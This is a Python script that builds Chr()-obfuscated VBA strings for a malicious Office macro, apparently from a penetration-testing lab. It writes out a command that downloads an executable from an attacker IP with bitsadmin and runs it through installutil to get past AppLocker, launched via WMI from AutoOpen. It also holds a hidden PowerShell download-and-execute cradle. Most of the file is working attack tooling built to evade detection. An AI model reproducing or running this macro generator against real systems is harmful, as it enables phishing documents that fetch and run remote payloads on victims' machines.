#!/usr/bin/env python3
"""Generate "fruited" VBA string constants.

"Fruiting" = obfuscation by converting each ASCII character to its decimal
representation and rebuilding the string at runtime with Chr(<decimal>) — the same
technique used in the Office macro tradecraft. No plaintext URL / command is stored.

Usage:
   1. Edit IP below.
   2. python3 vbagen.py
   3. Paste the printed a/b/c/d lines into vbagen-macro.vba,
      or the printed `cmd` line into vba-direct-macro.vba.
"""

IP = "192.168.45.177"   # <-- set your attacker IP

url = f"http://{IP}/InstallUtil.exe"

# Command the macro runs via WMI: bitsadmin download -> installutil.exe /U
p = (
    f'cmd /c "bitsadmin /Transfer job5 /download /priority FOREGROUND {url} '
    f'c:\\windows\\tasks\\run.exe && '
    f'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe '
    f'/logfile= /LogToConsole=false /U C:\\windows\\tasks\\run.exe"'
)

doc  = "info.doc"
wmi1 = "winmgmts:"
wmi2 = "Win32_Process"

# Alternative: direct PowerShell download cradle (no InstallUtil / LOLBin needed,
# because macros are not limited by AppLocker).
ps_cradle = f"powershell -exec bypass -nop -w hidden -c iex((new-object net.webclient).downloadstring('http://{IP}/run.txt'))"


def fruit(s):
    """Convert each ASCII char of `s` to its decimal Chr() code."""
    return " & ".join(f"Chr({ord(c)})" for c in s)


def emit(name, s, width=18):
    """Print a VBA `name = Chr(..) & Chr(..) ...` assignment with line continuations."""
    parts = fruit(s).split(" & ")
    lines = []
    for i in range(0, len(parts), width):
        lines.append(" & ".join(parts[i:i + width]))
    print(f"{name} = {lines[0]}" + (" _" if len(lines) > 1 else ""))
    for idx, ln in enumerate(lines[1:]):
        end = " _" if idx < len(lines[1:]) - 1 else ""
        print(f"     & {ln}{end}")
    print()


if __name__ == "__main__":
    print(f"' command ({len(p)} chars): {p}\n")
    print("' --- paste into vbagen-macro.vba AutoOpen() ---")
    emit("a", doc)
    emit("b", p)
    emit("c", wmi1)
    emit("d", wmi2)
    print("' --- alternative: paste `cmd` into vba-direct-macro.vba ---")
    emit("cmd", ps_cradle)
